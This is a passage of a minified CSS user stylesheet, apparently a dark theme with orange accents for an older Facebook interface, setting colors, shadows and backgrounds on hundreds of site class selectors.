3px;}\n\na:hover,.inputbutton:hover,.inputsubmit:hover,.accent,.hover,.domain_name:hover,#standard_error,.UIFilterList_Selected a:hover,input[type=\"submit\"]:not(.fg_action_hide):hover,.button_text:hover,#presence_applications_tab:hover,.UIActionMenu:hover,.attachment_link a span:hover,.UIIntentionalStory_Time a:hover,.UIPortrait_Text .title:hover,.UIPortrait_Text .title span:hover,.comment_link:hover,.request_link span:hover,.UIFilterList_ItemLink .UIFilterList_Title:hover,.UIActionMenu_Text:hover,.UIButton_Text:hover,.inner_button:hover,.panel_item span:hover,li[style*=\"background-color: rgb(255,255,255)\"] .friend_status,.dh_new_media span:hover,a span:hover,.tab_link:hover *,button:hover,#buddy_list_tab:hover *,.tab_handle:hover .tab_name span,.as_link:hover span,input[type=\"button\"]:hover,.feedback_show_link:hover,.page:hover .text,.group:hover .text,.calltoaction:hover .seeMoreTitle,.liketext:hover,.tickerStoryBlock:hover .uiStreamMessage span,.tickerActionVerb,.mleButton:hover,.bigNumber,.pluginRecommendationsBarButton:hover {color: #FF9D52 !important;text-shadow: #fff 0 0 2px !important;text-decoration: none !important;}\n\n\n.fbChatSidebar .fbChatTypeahead .textInput,.fbChatSidebarMessage,.devsitePage .body > .content {box-shadow: none !important;}\n\n.presence_menu_opts,#header,.LJSDialog,.chat_window_wrapper,#navAccount ul,.fbJewelFlyout,.uiTypeaheadView,.uiToggleFlyout { box-shadow: 0 0 3em #000; }\n\n.UIRoundedImage,.UIContentBox_GrayDarkTop,.UIFilterList > .UIFilterList_Title, .dialog-title,.flyout,.uiFacepileItem .uiTooltipWrap {box-shadow: 0 0 1em 1px #000;}\n\n.extra_menus ul li:hover,.UIRoundedBox_Box,.fb_menu_link:hover,.UISelectList_Item:hover,.fb_logo_link:hover,.hovered,#presence_notifications_tab,#chat_tab_barx,.tab_button_div,.plays_val, #mailBoxItems li a:hover,.buddy_row a:hover,.buddyRow a:hover,#navigation a:hover,#presence_applications_tab,#buddy_list_tab,#presence_error_section,.uiStepSelected .middle,.jewelButton,#pageLogo,.fbChatOrderedList .item:hover,.uiStreamHeaderTall {box-shadow: 0 0 3px #000,inset 0 0 5px #000 !important;}\n\n\n.topNavLink > a:hover,#navAccount.openToggler,.selectedCheckable {box-shadow: 0 0 4px 2px #FF9D52,inset 0 0 2em #FFAA66 !important;}\n\n\n.fbChatBuddyListDropdown .uiButton,.promote_page a,.create_button a,.share_button_browser div,.silver_create_button,.button:not(.uiSelectorButton):not(.close):not(.videoicon),button:not(.as_link),.GBSearchBox_Button,.UIButton_Gray,.UIButton,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,.UIActionMenu_SuppressButton,.UIConnectControlsListSelector .uiButton,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton),.fbTimelineRibbon,#fbDockChatBuddylistNub .fbNubButton,.pluginRecommendationsBarButtonLike {box-shadow: 0 0 .5em rgba(0,0,0,0.9),inset 0 0 .75em #FF9D52 !important;border-width: 0 !important; }\n\n.fbChatBuddyListDropdown .uiButton:hover,.uiButton:not(.uiSelectorButton):hover,.fbPrivacyWidget .uiSelectorButton:not(.lockButton):hover,.uiButtonSuppressed:hover,.UIButton:hover,.UIActionMenu_Wrap:hover,.tabs li:hover,.ntab:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([type=\"Flag\"]):not([type=\"submit\"]):hover,.inputsubmit:hover,.promote_page:hover,.create_button:hover,.share_button_browser:hover,.silver_create_button_shell:hover,.painted_button:hover,.flyer_button:hover,.button:not(.close):not(.uiSelectorButton):not(.videoicon):hover,button:not(.as_link):hover,.GBSearchBox_Button:hover,.tagsWrapper,.UIConnectControlsListSelector .uiButton:hover,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton):hover,.fbTimelineMoreButton:hover,#fbDockChatBuddylistNub .fbNubButton:hover,.tab > div:not(.title):hover,.detail.frame:hover,.pluginRecommendationsBarButtonLike:hover {box-shadow: 0 0 .5em #000,0 0 1em 3px #FF9D52,inset 0 0 2em #FFAA66 !important;}\n\n#icon_garden,.list_select .friend_list {box-shadow: 0 0 3px -1px #000,inset 0 0 3px -1px #000;}\n\n.bb .fbNubButton,.uiScrollableAreaGripper {box-shadow: inset 0 4px 8px #FF9D52,0 0 1em #000 !important;}\n\n.bb .fbNubButton:hover {box-shadow: inset 0 4px 8px #FF9D52,0 .5em 1em 1em #FF9D52 !important;}\n\n.fbNubFlyoutTitlebar {box-shadow: inset 0 4px 8px #FF9D52;padding: 0 4px !important;}\n\n#fb_menubar,.progress_bar_outer {box-shadow: inset 0 0 3px #000,0 0 3em 3px #000;}\n#presence_ui {box-shadow: 0 0 3em 1px #000}\n\n#buddy_list_tab:hover,.tab_handle:hover,.focused  {box-shadow: 0 0 3px #000,inset 0 0 3px #000,0 0 3em 5px #fff;}\n\n.uiSideNavCount,.jewelCount,.uiContextualDialogContent,.fbTimelineCapsule .fbTimelineTwoColumn > .timelineUnitContainer:hover,.timelineReportContainer:hover,.uiOverlayPageContent,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.uiScaledImageContainer:hover {box-shadow: 0 0 1em 4px #FF9D52 !important;}\n\n.img_link:hover,.album_thumb:hover,.fbChatTourCallout .body,.fbSidebarGripper div {box-shadow: 0 0 3em #FF9D52;}\n\n.shaded,.progress_bar_inner,.tickerStoryAllowClick {box-shadow: inset 0 0 1em #FF9D52 !important}\n\n.UIPhotoGrid_Table .UIPhotoGrid_TableCell:hover .UIPhotoGrid_Image,#myphoto:hover,.mediaThumbWrapper:hover,.uiVideoLink:hover,.mediaThumb:hover,#presence.fbx_bar #presence_ui #presence_bar .highlight,.fbNubFlyout:hover,.hovercard .stage,#fbDockChatBuddylistNub .fbNubFlyout:hover,.balloon-content,.-cx-PRIVATE-uiDialog__border  {box-shadow: 0 0 3em 5px #FF9D52 !important;}\n\n.fbNubFlyout,.uiMenuXBorder {box-shadow: 0 0 3em 5px #000 !important;}\n\n#blueBar {box-shadow: 0 0 1em 3px #000;}\n\n.fill {box-shadow: inset 0 0 2em #FFAA66,0 0 1em #000 !important;}\n\n\ninput[type=\"file\"]{-moz-appearance:none!important;border: none !important;}\n\n\n.status_text,h4,a,h2,.flyout_menu_title,.url,#label_nm,h5,.WelcomePage_MainMessage,#public_link_uri,#public_link_editphoto span,#public_link_editalbum span,.dh_subtitle,.app_name_heading,.box_head,.presence_bar_button span,a:link span,#public_link_album span,.note_title,.link_placeholder,.stories_title,.typeahead_suggestion,.boardkit_title,.section-title strong,.inputbutton,.inputsubmit,.matches_content_box_title,.tab_name,.header_title_text,.signup_box_message,.quiz_start_quiz,.sidebar_upsell_header,.wall_post_title,.megaphone_header,.source_name,.UIComposer_AttachmentLink,.fcontent > .fname,#presence_applications_tab,.mfs_email_title,.flyout .text,.UIFilterList_ItemLink .UIFilterList_Title,.announce_title,.attachment_link a span,.comment_author,.UIPortrait_Text .title,.comment_link,.UIIntentionalStory_Names,#profile_name,.UIButton_Text,.dh_new_media span,.share_button_browser div,.UIActionMenu_Text,.UINestedFilterList_Title,button,.panel_item span,.stat_elem,.action,#contact_importer_container input[value=\"Find Friends\"]:hover,.navMore,.navLess,input[name=\"add\"],input[name=\"actions[reject]\"],input[name=\"actions[accept]\"],input[name=\"actions[maybe]\"],.uiButtonText,.as_link .default_message,.feedback_hide_link,.feedback_show_link,#fbpage_fan_sidebar_text,.comment_actual_text a span,.uiAttachmentDesc a span,.uiStreamMessage a span,.group .text,.page .text,.uiLinkButton input,.blueName,.uiBlingBox span.text,.commentContent a span,.uiButton input,.fbDockChatTab .name,.simulatedLink,.bfb_tab_selected,.liketext,a.UIImageBlock_Content,.uiTypeaheadView li .text,.author,.authors,.itemLabel,.passiveName,.token,.fbCurrentTitle,.fbSettingsListItemLabel,.uiIconText,#uetqg1_8,.fbRemindersTitle,.mleButton,.uiMenuItem .selected .name  {color: #FF9D52 !important;}\n\n#email,option,.disclaimer,.info dd,.UIUpcoming_Info,.UITos_ReviewDescription,.settings_box_text,div[style*=\"color: rgb(85,85,85)\"] {color: #999 !important;}\n\n.status_time,.header_title_wrapper,.copyright,#newsfeed_submenu,#newsfeed_submenu_content strong,.summary,.caption,.story_body,.social_ad_advert_text,.createalbum dt,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_count,p,.fbpage_fans_count,.fbpage_type,.quiz_title,.quiz_detailtext,.byline,label,.fadvfilt b,.fadded,.fupdt,.label,.main_subtitle,.minifeed_filters li,.updates_settings,#public_link_photo,#phototags em,#public_link_editphoto,.note_dialog,#public_link_editalbum,.block_add_person,.privacy_page_field,.action_text,.network,.set_filters span,.byline span,#no_notes,#cheat_sheet,.form_label,.share_item_actions,.options_header,.box_subtitle,.review_header_subtitle_line,.summary strong,.upsell dd,.availability_text,#public_link_album,.explanation,.aim_link,.subtitle,#profile_status,span[style*=\"color: rgb(51,51,51)\"],.fphone_label,.phone_type_label,.sublabel,.gift_caption,dd span,.events_bar,.searching,.event_profile_title,.feedBackground,.fp_show_less,.increments td,.status_confirm,.sentence,.admin_list span,.boardkit_no_topics,.boardkit_subtitle,.petition_preview,.boardkit_topic_summary,li,#photo_badge,.status_body,  .spell_suggest_label,.pg_title,.white_box,.token span,.profile_activation_score,.personal_msg span,.matches_content_box_subtitle span,tr[fbcontext=\"41097bfeb58d\"] td,.title,.floated_container span:not(.accent),div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(68,68,68)\"],.present_info_label,.fbpage_description,.tagged span,#tags h2 strong,#tags div span,.detail,.chat_info_status,.gray-text,.author_header,.inline_comment,.fbpage_info,.gueststatus,.no_pages,.topic_pager,.header_comment span,div[style*=\"color: rgb(101,107,111)\"],#q,span[style*=\"color: rgb(85,85,85)\"],.pl-item,.tagged_in,.pick_body,td[style*=\"color: rgb(85,85,85)\"],strong[style*=\"color: rgb(68,68,68)\"],div[style*=\"color: gray\"],.group_officers dd,.fbpage_group_title,.application_menu_divider,.friend_status span,.more_info,.logged_out_register_subhead,.logged_out_register_footer,input[type=\"text\"],textarea,.status_name span,input[type=\"file\"],.UIStoryAttachment_Copy,.stream_participants_short,.UIHotStory_Copy,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not(.UIButton_Text):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),input[type=\"search\"],input[type=\"input\"],.inputtext,.relationship span,input[type=\"button\"]:not([value=\"Comment\"]),input[type=\"password\"],#reg_pages_msg,.UIMutableFilterList_Tip,.like_sentence,.UIIntentionalStory_InfoText,.UIHotStory_Why,.question_text,.UIStory,.tokenizer,input[type=\"hidden\"],.tokenizer_input *,.text:not(.external),.flistedit b,.fexth,.UIActionMenu_Main,span[style*=\"color: rgb(102,102,102)\"],div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(119,119,119)\"],blockquote,.description,.security_badge,.full_name,.email_display,.email_section,.chat_fl_nux_messaging,.UIObjectListing_Subtext,.confirmation_login_content,.confirm_username,.UIConnectControls_Body em,.comment_actual_text,.status,.UICantSeeProfileBlurbText,.UILiveLink_Description,.recaptcha_text,.UIBeep_Title,.UIComposer_Attachment_ShareLink_URL,.app_dir_app_category,.first_stat,.aggregate_review_title,.stats span,.facebook_disclaimer,.app_dir_app_creator,.app_dir_app_monthly_active_users,.app_dir_app_friend_users,.UISearchFilterBar_Label,.UIFullListing_InfoLabel,.email_promise_detail,.title_text,.excerpt,.dialog_body,.tos,.UIEMUASFrame_body,.page_note,.nux_highlight_composer,.UIIntentionalStory_BottomAttribution,.tagline,.GBSelectList,.gigaboxx_thread_header_authors,.GBThreadMessageRow_ReferrerLink,#footerWrapper,.infoTitle,.fg_explain,.UIMentor_Message,.GenericStory_BottomAttribution,.chat_input,.video_timestamp span,#tagger_prompt,.UIImageBlock_Content,.new_list span, .GBSearchBox_Input input,.SearchPage_EmailSearchLeft,.sub_info,.UIBigNumber_Label,.UIInsightsGeoList_ListTitle,.UIInsightsGeoList_ListItemValue,.UIInsightsSmall_Note,.textmedium,.UIFeedFormStory_Lead,.home_no_stories_content, .title_label,div[style*=\"color: rgb(102,102,102)\"],*[style*=\"color: rgb(51,51,51)\"],.tab_box_inner,.uiStreamMessage,.privacy_section_description,.info_text,.uiAttachmentDesc,.uiListBulleted span,.privacySettingsGrid th,.recommendations_metadata,.postleft dd:not(.usertitle),.postText,.mall_post_body_text,.fbChatMessage,.fbProfileBylineFragment,.nosave option,.uiAttachmentDetails,.fbInsightsTable td,.mall_post_body,.uiStreamPassive,.snippet,.questionInfo span,.promotionsHowto,.fcg,.headerColumn .fwb,.rowGroupTitle .fwb,.rowGroupDescription .fwb,.likeUnit,.aboveUnitContent,.placeholder,.sectionContent,.UIFaq_Snippet,.uiMenuItem:not(.checked) .name,.balloon-text,.fbLongBlurb,.legendLabel,.messageBody {color: #bbb !important;}\n\n.status_clear_link,h3,h1,.updates,.WelcomePage_SignUpHeadline,.WelcomePage_SignUpSubheadline,.mock_h4 .left,.review_header_title,caption,.logged_out_register_msg,.domain_name, .UITitledBox_Title,.signup_box_content,.highlight,.question,.whocan span,.UIFilterList > .UIFilterList_Title,.subject,.UIStoryAttachment_Label,.typeahead_message,.UIShareStage_Title,.alternate_name,.helper_text,.textlarge,.page .category,.item_date,.privacy_section_label,.privacy_section_title,.uiTextMetadata, .seeMoreTitle,.categoryContents,code,.usertitle,.fbAppSettingsPageHeader,.fsxl,.LogoutPage_MobileMessage,.LogoutPage_MobileSubmessage,.recommended_text,#all_friends_text,.removable,.ginormousProfileName,.experienceContent .fwb,#bfb_t_popular_body div[style*=\"color:#880000\"],.fsm:not(.snippet):not(.itemLabel):not(.fbChatMessage),.uiStreamHeaderTextRight,.bookmarksNavSeeAll,.tab .content,.fbProfilePlacesFilterCount,.fbMarketingTextColorDark,.pageNumTitle,.pluginRecommendationsBarButton {color: #FFAA66 !important;}\n\n.em,.story_comment_back_quote,.story_content,small,.story_content_excerpt,.walltext,.public,p span,#friends_page_subtitle,.main_title,.empty_message,.count,.count strong,.stories_not_included li span,.mobile_add_phone th,#friends strong,.current,.no_photos,.intro,.sub_selected a,.stats,.result_network,.note_body,#bodyContent div b,#bodyContent div,.upsell dt,.buddy_count_num strong,.left,.body,.tab .current,.aim_link span,.story_related_count,.admins span,.summary em,.fphone_number,.my_numbers_label,.blurb_inner,.photo_header strong,.note_content,.multi_friend_status,.current_path span,.current_path,.petition_header,.pyramid_summary strong,#status_text,.contact_email_pending em,.profile_needy_message,.paging_link div,.big_title,.fb_header_light,.import_status strong,.upload_guidelines ul li span,.upload_guidelines ul li span strong,#selector_status,.timestamp strong,.chat_notice,.notice_box,.text_container,.album_owner,.location,.info_rows dd,.divider,.post_user,div[style=\"color: rgb(101,107,111);\"] b,div[style=\"color: rgb(51,51,51);\"] b,.basic_info_summary_and_viewer_actions dd,.profile_info dd,.story_comment,p strong,th strong,.fstatus,.feed_story_body,.story_content_data,.home_prefs_saved p,.networks dd,.relationship_status dd,.birthday dd,.current_city dd,.UIIntentionalStory_Message,.UIFilterList_Selected a,.UIHomeBox_Title,.suggestion,.spell_suggest,.UIStoryAttachment_Caption,.fexth + td,.fext_short,#fb_menu_inbox_unread_count,.Tabset_selected .arrow .sel_link span,.UISelectList_check_Checked,.chat_fl_nux_header,.friendlist_status .title a,.chat_setting label,.UIPager_PageNum,.good_username,.UIComposer_AttachmentTitle,.rsvp_option:hover label,.Black,.comment_author span,.fan_status_inactive,.holder,.UIThumbPagerControl_PageNumber,.text_center,.nobody_selected,.email_promise,.blocklist ul,#advanced_body_1 label,.continue,.empty_albums,div[style*=\"color: black\"],.GBThreadMessageRow_Body_Content,.UIShareStage_Subtitle,#public_link_photo span,.GenericStory_Message,.UIStoryAttachment_Value,div[style*=\"color: black\"],.SearchPage_EmailSearchTitle,.uiTextSubtitle,.jewelHeader,.recent_activity_settings_label,.people_list_item,.uiTextTitle,.tab_box,.instant_personalization_title,.MobileMMSEmailSplash_Description,.MobileMMSEmailSplash_Tipsandtricks_Title,.fcb,input[value=\"Find Friends\"],#bodyContent,#bodyContent table,h6,.fbChatBuddylistError,.info dt,.bfb_options_minimized_hide,.connect_widget_connected_text,body.transparent_widget .connect_widget_not_connected_text,.connect_widget_button_count_count,.fbInsightsStatisticNumber,.fbInsightsTable thead th span,.header span,.friendlist_name a,.count .countValue,.uiHeaderTitle span,#about_text_less span,.uiStreamHeaderText,.navHeader,.uiAttachmentTitle,.fbProfilePlacesFilterText,.tagName,.ufb-dataTable-header-text,.ufb-text-content,.fb_content,.uiComposerAttachment .selected .attachmentName,.balloon-title,.cropMessage {color: #fff !important;}\n\n.bfb_post_action_container {opacity: .25 !important;}\n.bfb_post_action_container:hover {opacity: 1 !important;}\n\n.valid,.wallheader small,#photodate,.video_timestamp strong,.date_divider span,.feed_msg h5,.time,.item_contents,.boardkit_topic_updated,.walltime,.feed_time,.story_time,#status_time_inner,.written small,.date,div[style*=\"color: rgb(85,82,37)\"],.timestamp span,.time_stamp,.timestamp,.header_info_timestamp,.more_info div,.timeline,.UIIntentionalStory_Time,.fupdt,.note_timestamp,.chat_info_status_time,.comment_actions,.UIIntentionalStory_Time a,.UIUpcoming_Time,.rightlinks,.GBThreadMessageRow_Date,.GenericStory_Time a,.GenericStory_Time,.fbPrivacyPageHeader,.date_divider {color: #FFAA66 !important;}\n\n.textinput,select,.list_drop_zone,.msg_divide_bottom,textarea,input[type=\"text\"],input[type=\"file\"],input[type=\"search\"],input[type=\"input\"],input[type=\"password\"],.space,.tokenizer,input[type=\"hidden\"],#flm_new_input,.UITooltip:hover,.UIComposer_InputShadow,.searchroot input,input[name=\"search\"],.uiInlineTokenizer,input.text,input.nosave {background: rgba(0,0,0,.50) !important;-moz-appearance:none!important;color: #bbb !important;border: none !important;padding: 3px !important; }\n\ninput[type=\"text\"]:focus,textarea:focus,.fbChatSidebar .fbChatTypeahead .textInput:focus {box-shadow: 0 0 .5em #FF9D52,inset 0 0 .25em #FFAA66 !important;}\n\n.uiOverlayPageWrapper,#fbPhotoSnowlift,.shareOverlay,.tlPageRecentOverlay  {background: -webkit-radial-gradient(50% 50%,circle,rgba(10,10,10,.6),rgb(10,10,10) 90%) !important;}\n\n.bumper,.stageBackdrop {background: #000 !important;}\n#page_table {background: #333 }\n\n.checkableListItem:hover a,.selectedCheckable a  {background: #FFAA66 !important; }\n\n.GBSearchBox_Input,.tokenizer,.LTokenizerWrap,#mailBoxItems li a:hover,.uiTypeaheadView .search .selected,.itemAnchor:hover,.notePermalinkMaincol .top_bar, .notification:hover a,#bfb_tabs div:not(.bfb_tab_selected),.bfb_tab,.navIdentity form:hover,.connect_widget_not_connected_text,.uiTypeaheadView li.selected,.connect_widget_number_cloud,.placesMashCandidate:hover,.highlight,#bfb_option_list li a:hover {background: rgba(0,0,0,.5) !important;}\n\n.results .page,.calltoaction,.results li,.fbNubFlyout,.contextualBlind,.bfb_dialog,.bfb_image_preview,input.text,.fbChatSidebar,.jewelBox,.clickToTagMessage,.tagName,.ufb-tip-body,.flyoutContent,.fbTimelineMapFilterBar,.fbTimelineMapFilter,.fbPhotoStripTypeaheadForm,.groupsSlimBarTop,.pas,.contentBox,.fbMapCalloutMain {background: rgba(10,10,10,.75) !important;}\n\n#pageNav .tinyman:hover a,#navHome:hover a,#pageNav .tinyman a[style*=\"cursor: progress\"],#navHome a[style*=\"cursor: progress\"],#home_filter_list,#home_sidebar,#contentWrapper,.LDialog,.dialog-body,.LDialog,.LJSDialog,.dialog-foot,.chat_input,#contentCol,#leftCol,.UIStandardFrame_Content,.red_box,.yellow_box,.uiWashLayoutOffsetContent,.uiOverlayContent,.bfb_post_action_container,.connect_widget_button_count_count,.shaded,.navIdentitySub,.jewelItemList li a:hover,.fbSidebarGripper div,.jewelCount,.uiBoxRed,.videoUnit,.lifeEventAddPhoto,.fbTimelineLogIntroMegaphone,.uiGamesLeaderboardItem,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.newInterestListNavItem:hover,.ogSliderAnimPagerPrevContent,.ogSingleStoryStatus,.ogSliderAnimPagerNextContent,.-cx-PRIVATE-uiDialog__body  {background: rgba(10,10,10,.5) !important;}\n\n#home_stream,pre,.ufiItem,.odd,.uiBoxLightblue,.platform_dialog_bottom_bar,.uiBoxGray,.fbFeedbackPosts,.mall_divider_text,.uiWashLayoutGradientWash, #bfb_options_body,.UIMessageBoxStatus,.tip_content .highlight,.fbActivity, .auxlabel,.signup_bar_container,#wait_panel,.FBAttachmentStage,.sheet,.uiInfoTable .name,.HCContents,#devsiteHomeBody .content,.devsitePage .nav .content,#confirm_phone_frame,.fbTimelineCapsule .timelineUnitContainer,.timelineReportContainer,.aboveUnitContent,.aboutMePagelet,#pagelet_tab_content_friends,#fbProfilePlacesBorder,#pagelet_tab_content_notes,.externalShareUnit,.fbTimelineNavigationWrapper .detail,.tosPaneInfo,.navSubmenu:hover,#bfb_donate_pagelet > div,.better_fb_mini_message,.uiBoxWhite,.uiLoadingIndicatorAsync,.mleButton,.fbTimelineBoxCount,.navSubmenu:hover,.gradient,.profileBrowserGrid tr > td > div,.statsContainer,#admin_panel,.fbTimelineSection {background: rgba(20,20,20,.4) !important;}\n\n.uiSelector .uiSelectorButton,.UIRoundedBox_Corner,.quote,.em,.UIRoundedBox_TL,.UIRoundedBox_TR,.UIRoundedBox_BR,.UIRoundedBox_LS,.UIRoundedBox_BL,.profile_color_bar,.pagefooter_topborder,.menu_content,h3,#feed_content_section_friend_lists,ul,li[class=\"\"],.comment_box,.comment,#homepage_bookmarks_show_more,.profile_top_wash,.canvas_container,.composer_rounded,.composer_well,.composer_tab_arrow,.composer_tab_rounded,.tl,.tr,.module_right_line_block,.body,.module_bottom_line,.lock_b_bottom_line,#info_section_info_2530096808 .info dt,.pipe,.dh_new_media,.dh_new_media .br,.frn_inpad,#frn_lists,#frni_0,.frecent span,h3 span,.UIMediaHeader_TitleWash,.editor_panel .right,.UIMediaButton_Container tbody *,#userprofile,.profile_box,.date_divider span,.corner,.profile #content .UIOneOff_Container,.ff3,.photo #nonfooter #page_height,.home #nonfooter #page_height,.home .UIFullPage_Container,.main-nav,.generic_dialog,#fb_multi_friend_selector_wrapper,#fb_multi_friend_selector,.tab span,.tabs,.pixelated,.disabled,.title_header .basic_header,#profile_tabs li,#tab_content,.inside td,.match_link span,tr[fbcontext=\"41097bfeb58d\"] table,.accent,#tags h2,.read_updates,.user_input,.home_corner,.home_side,.br,.share_and_hide,.recruit_action,.share_buttons,.input_wrapper,.status_field,.UIFilterList_ItemRight,.link_btn_style span,.UICheckList_Label,#flm_list_selector .Tabset_selected .arrow,#flm_list_selector .selector .arrow .sel_link,.friendlist_status .title a,.online_status_container,.list_drop_zone_inner,.good_username,.WelcomePage_Container,.UIComposer_ShareButton *,.UISelectList_Label,.UIComposer_InputShadow .UIComposer_TextArea,.UIMediaHeader_TitleWrapper,.boxtopcool_hg,.boxtopcool_trg,.boxtopcool_hd,.boxtopcool_trd,.boxtopcool_bd,.boxtopcool_bg,.boxtopcool_b,#confirm_button,.title_text,#advanced_friends_1,.fb_menu_item_link,.fb_menu_item_link small,.white_hover,.GBTabset_Pill span,.UINestedFilterList_ItemRight,.GBSearchBox_Input input,.inline_edit,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.LTokenizer,.Mentions_Input,form.comment div,.ufi_section,.BubbleCount,.BubbleCount_Right,.UIStory,.object_browser_pager_more,.friendlist_name,.friendlist_name a,.switch,#tagger,.tagger_border,.uiTooltip,#reorder_fl_alert,.UIBeeper_Full,#navSearch,#navAccount,#navAccountPic,#navAccountName,#navAccountInfo,#navAccountLink,#mailBoxItems,#pagelet_chat_home h4,.buddy_row,.home_no_stories,#xpageNav li .navSubmenu,.uiListItem:not(.ufiItem),.uiBubbleCount,.number,.fbChatBuddylistPanel,.wash,.settings_screenshot,.privacyPlan .uiListItem:hover,.no_border,.auxiliary .highlight,.emu_comments_box_nub,.numberContainer,.uiBlingBox,.uiBlingBox:hover span,.callout_buttons,.uiWashLayoutEmptyGradientWash,.inputContainer,.editNoteWrapperInput,.fbTextEditorToolbar,.logoutButton input,#contentArea .uiHeader + .uiBoxGray,.uiTokenizer,#bfb_tabs,.profilePictureNuxHighlight,.profile-picture,#ci_module_list,.textBoxContainer,#date_form .uiButton,.insightsDateRange,.MessagingReadHeader,.groupProfileHeaderWash,.questionSectionLabel,.metaInfoContainer,.uiStepList ol,.friend_list,.fbFeedbackMentions,.bb .fbNubFlyoutHeader,.bb .fbNubFlyoutFooter,.fbNubFlyoutInner .fbNubFlyoutFooter,.gradientTop,.gradientBottom,.helpPage,.fbEigenpollTypeahead .plus,.uiSearchInput,.opengraph,#developerAppDetailsContent,.timelineLayout #contentCol,.attachmentLifeEvents,.fbProfilePlacesFilterBar,.uiStreamHeader,.uiStreamHeaderChronologicalForm,.inner .text,.pageNotifPopup,.uiButtonGroup,.navSubmenuPageLink,.fbTimelineTimePeriod,.bornUnit,.mleFooter,#bfb_filter_add_row,#bfb_options .option .no_hover,.fbTimelinePhotosSeparator h4 span,.withsubsections,.showMore,.event_profile_information tr:hover,.nux_highlight_nub,.uiSideNav .uiCloseButton,.uiSideNav .uiCloseButton input,.fb_content,.uiComposerAttachment .selected .attachmentName,.fbHubsTokenizer,.coverEmptyWrap,.uiStreamHeaderText,.pagesTimelineButtonPagelet,.fbNubFlyoutBody,#pageNav .tinyman:hover,#navHome:hover,.fbRemindersThickline,.uiStreamEdgeStoryLine hr,.uiInfoTable tbody tr:hover,.fbTimelineUFI,#contentArea,.leftPageHead,.rightPageHead,.anchorUnit,#pageNav .topNavLink a:focus,.timeline_page_inbox_bar,.uiStreamEdgeStoryLineTx,.pluginRecommendationsBarButton,.pluginRecommendationsBarTop table  {background: transparent !important;}\n\n.UIObject_SelectedItem,.sidebar_item_header,.announcement_title,#pagefooter,.selected:not(.key-messages):not(.key-events):not(.key-media):not(.key-ff):not(.page):not(.group):not(.user):not(.app),.date_divider_label,.profile_action,.blurb ,.tabs_more_menu,.more a span,.selected h2,.column h2,.ffriends,.make_new_list_button_table tr,.title_header,.inbox_menu,.side_column,.section_header h3 span,.media_header,#album_container,.note_dialog,.dialog,.has_app,.UIMediaButton_Container,.dialog_title,.dialog_content,#mobile_notes_announcement,.see_all,#profileActions,.fbpage_group_title,.UIProfileBox_SubHeader,#profileFooter,.share_header,#share_button_dialog,.flag_nav_item_selected,.new_user_guide_content h2,#safety_page h4,.section_banner,.box_head,#header_bar,.content_sidebar h3,.content_header,#events h3,#blog h3,.footer_border_bottom,.firstHeading,#footer,.recent_news h3,.wrapper div h2,.UIProfileBox_Header,.box_header,.bdaycal_month_section,#feedTitle,.pop_content,#linkeditor,.UIMarketingBox_Box,.utility_menu a,.typeahead_list,.typeahead_suggestions,.typeahead_suggestion,.fb_dashboard_menu,.green_promotion,.module h2,.current_path,.boardkit_title,.current,.see_all2,.plain,.share_post,.add-link,li.selected,.active_list a,#photoactions a:not(#rotaterightlink):not(#rotateleftlink),.UIPhotoTagList_Header,.dropdown_menu,.menu_content,.menu_content li a:hover,.menu_content li:hover,#edit_profilepicture,.menu_content div a:hover,.contact_email_pending,.req_preview_guts,.inputbutton,.inputsubmit,.activation_actions_box,.wall_content,.matches_content_box_title,.new_menu_selected,#editnotes_content,#file_browser,.chat_window_wrapper,.chat_window,.chat_header,.hover,.dc_tabs a,.post_header,.header_cell,#error,.filters,.pages_dashboard_panel h2,.srch_landing h2,.bottom_tray,.next_action,.pl-divider-container,.sponsored_story,.header_current,.discover_concerts_box,.header,.sidebar_upsell_header,.activity_title h2,.wall_post_title,#maps_options_menu,.menu_link,.gamerProfileTitleBar,.feed_rooster ,.emails_success,.friendTable table:hover,.board_topic:hover,.fan_table table:hover,#partylist .partyrow:hover,.latest_video:hover,.wallpost:hover,.profileTable tr:hover,.friend_grid_col:hover,.bookmarks_list li:hover,.requests_list li:hover,.birthday_list li:hover,.tabs li,.fb_song:hover,.share_list .item_container:hover,.written a:hover,#photos_box .album:hover,.people .row .person:hover,.group_list .group:hover,.confirm_boxes .confirm:hover,.posted .share_item_wide .share_media:hover,.note:hover,.editapps_list .app_row:hover,.my_networks .blocks .block:hover,.mock_h4,#notification_options tr:hover,.notifications_settings li:hover,.mobile_account_main h2,.language h4,.products_listing .product:hover,.info .item .item_content:hover,.info_section:hover,.recent_notes p:hover,.side_note:hover,.suggestion,.story:hover,.post_data:hover,.album_row:hover,.track:hover,#pageheader,.message:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIActionButton,.UIActionButton_Link,.confirm_button,.silver_dashboard,span.button,.col:hover,#photo_tag_selector,#pts_userlist,.flink_dropdown,.flink_inner,.grouprow:hover,#findagroup h4,#startagroup h4,.actionspro 